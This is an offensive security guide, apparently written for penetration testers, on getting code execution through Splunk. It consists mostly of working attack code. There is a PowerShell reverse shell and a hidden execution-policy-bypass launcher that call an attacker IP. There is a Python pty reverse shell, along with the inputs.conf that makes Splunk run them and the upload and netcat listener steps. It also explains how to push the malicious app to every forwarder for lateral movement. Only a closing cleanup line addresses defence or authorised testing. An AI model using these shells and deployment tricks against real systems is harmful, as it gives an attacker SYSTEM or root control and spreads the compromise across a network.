# Attacking Splunk

Admin access to any Splunk instance converts directly to code execution through scripted inputs, a built-in feature designed for custom data collection. Since Splunk ships with Python on every platform and runs as `SYSTEM` or `root` in most deployments, a shell from Splunk almost always comes back with maximum privilege.

***

## The Attack Path

The technique works by building a minimal Splunk app containing a reverse shell script and an `inputs.conf` file that tells Splunk to run it on a set interval. Once uploaded through the web UI, the app is automatically enabled and the script fires within seconds. The [reverse_shell_splunk](https://github.com/0xjpuff/reverse_shell_splunk) package on GitHub provides ready-made templates for both Windows and Linux. 

***

## Step-by-Step: Windows Target

### 1. Build the App Structure

```bash
mkdir -p splunk_shell/bin splunk_shell/default
```

The final directory tree must look like this:

```
splunk_shell/
├── bin/
│   ├── run.ps1   # PowerShell reverse shell
│   └── run.bat   # Batch launcher
└── default/
    └── inputs.conf
```

### 2. Create the PowerShell Reverse Shell (run.ps1)

Replace the IP and port with your attacker machine details:

```powershell
$client = New-Object System.Net.Sockets.TCPClient('10.10.14.15',443);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String);
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
};
$client.Close()
```

### 3. Create the Batch Launcher (run.bat)

Splunk uses this to call the PowerShell script while bypassing execution policy:

```bat
@ECHO OFF
PowerShell.exe -exec bypass -w hidden -Command "& '%~dpn0.ps1'"
Exit
```

### 4. Create inputs.conf

The `interval` value is in seconds. The script will not run without this setting being present:

```ini
[script://./bin/rev.py]
disabled = 0
interval = 10
sourcetype = shell

[script://.\bin\run.bat]
disabled = 0
sourcetype = shell
interval = 10
```

### 5. Package the App

```bash
tar -cvzf updater.tar.gz splunk_shell/
```

### 6. Upload and Deploy

Start your listener before uploading:

```bash
sudo nc -lnvp 443
```

Navigate to Settings > Apps > Install app from file at:

```
https://<target>:8000/en-US/manager/appinstall/_upload
```

Click Browse, select `updater.tar.gz`, and click Upload. The shell fires as soon as the app is enabled:

```
connect to [10.10.14.15] from (UNKNOWN) [10.129.201.50] 53145

PS C:\Windows\system32> whoami
nt authority\system

PS C:\Windows\system32> hostname
APP03
```

***

## Step-by-Step: Linux Target

The process is identical except you modify `rev.py` instead of the PowerShell script. Edit the IP and port before packaging:

```python
import sys,socket,os,pty

ip="10.10.14.15"
port="443"
s=socket.socket()
s.connect((ip,int(port)))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn('/bin/bash')
```

Package, upload, and catch the shell the same way. The `inputs.conf` reference to `rev.py` handles the rest.

***

## Lateral Movement via Deployment Server

If the compromised Splunk instance is acting as a deployment server with Universal Forwarders checking in from other hosts across the network, the impact of your access multiplies significantly. 

To push code execution to every connected forwarder:

1. Place the malicious app in `$SPLUNK_HOME/etc/deployment-apps/` on the compromised server
2. Universal Forwarders poll the deployment server on a regular schedule and will automatically pull and execute the app

This means a single compromised Splunk server can provide shell access across every host in the environment that has a Universal Forwarder installed. In Windows-heavy environments, use the PowerShell-based app rather than the Python one since Universal Forwarders do not install Python the way the full Splunk server does. 

[CVE-2022-32158](https://nvd.nist.gov/vuln/detail/CVE-2022-32158) formalised this attack path as a vulnerability: a compromised forwarder endpoint can instruct the deployment server to push malicious bundles to all other enrolled forwarders, requiring no direct admin access to the server itself.  Patched in Splunk 8.1.10.1, 8.2.6.1, and 9.0+. 

> After the assessment, remove the uploaded app through Settings > Apps, confirm the `inputs.conf` entry is gone, and document the app name, upload path, and shell location in the report appendix.
